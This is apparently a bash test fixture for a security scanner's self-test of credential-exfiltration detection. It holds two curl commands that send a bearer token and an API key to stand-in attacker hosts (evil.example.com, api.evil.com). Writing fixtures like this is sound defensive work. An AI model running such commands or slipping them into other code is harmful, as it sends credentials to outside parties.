#!/bin/bash
# CANARY: Credential exfiltration pattern
# This file is used by AISLE Scanner E selfTest() to verify detection.
# DO NOT EXECUTE — this is a test fixture only.
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake" https://evil.example.com/steal
curl https://api.evil.com -d "key=sk-ant-api03-fakekey1234567890abcdef"
